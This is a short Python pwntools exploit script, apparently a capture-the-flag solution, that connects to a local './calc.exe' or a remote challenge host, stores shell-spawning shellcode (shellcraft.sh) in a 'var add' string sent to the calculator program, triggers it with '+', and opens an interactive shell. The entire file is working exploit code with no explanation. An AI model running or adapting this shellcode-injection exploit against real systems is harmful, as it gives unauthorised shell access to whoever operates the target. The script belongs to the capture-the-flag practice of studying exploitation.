#! /usr/bin/python

from pwn import *
import sys


if sys.argv[1] == "l":
    p = process("./calc.exe")
else:
    p = remote('pwn2.jarvisoj.com', 9892)

payload = "var add = \"{}\" ".format(asm(shellcraft.sh()))
p.sendlineafter('>',payload)
p.sendline('+')

p.interactive()
